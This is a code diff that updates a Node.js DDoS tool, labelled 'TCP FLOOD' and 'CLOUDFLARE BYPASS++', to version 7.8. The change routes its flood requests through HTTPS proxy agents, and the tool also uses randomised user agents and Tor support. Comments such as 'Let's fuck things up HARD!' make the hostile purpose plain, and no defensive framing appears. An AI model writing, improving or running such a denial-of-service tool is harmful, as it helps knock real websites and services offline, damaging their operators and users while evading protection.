@@ -5,7 +5,7 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v7.6 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
+// * DDoS TOOL - TCP FLOOD - v7.8 - APOCALYPSE EDITION! - CLOUDFLARE BYPASS++ *
 // ******************************************************************************
 
 // Configuration - Let's fuck things up HARD!
@@ -214,6 +214,7 @@ async function tcpFlood(threadId) {
     const https = require('https'); // Required for HTTPS proxy support
     const url = require('url');
     const dns = require('dns').promises;
+    const { HttpsProxyAgent } = require('https-proxy-agent');
 
     const isTor = targetURL.protocol === 'onion:';
     const isHTTPS = targetURL.protocol === 'https:';
@@ -269,11 +270,26 @@ async function tcpFlood(threadId) {
                         const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';
 
                         const parsedTargetURL = url.parse(targetURL.href);
-                        const options = {
-                            hostname: proxyHost,
+
+                        // Proxy agent options
+                        const agentOptions = {
+                            host: proxyHost,
                             port: proxyPort,
-                            path: parsedTargetURL.href,
+                            protocol: proxyProtocol,
+                            secureProxy: proxyProtocol === 'https',
+                            auth: proxyAuth ? `${proxyURL.username}:${proxyURL.password}` : undefined,
+                        };
+
+                        // Set proxy agent
+                        const proxyAgent = new HttpsProxyAgent(agentOptions);
+
+                        // HTTP options
+                        const options = {
+                            hostname: targetHost,
+                            port: port,
+                            path: parsedTargetURL.path,
                             method: 'GET',
+                            agent: proxyAgent,
                             headers: {
                                 'Host': targetHost,
                                 'User-Agent': getRandomUserAgent(),
@@ -314,6 +330,7 @@ async function tcpFlood(threadId) {
 
                         req.end();
                         resolve(req);
+
                     } else {
                         if (isHTTPS) {
                             // TLS/SSL connection
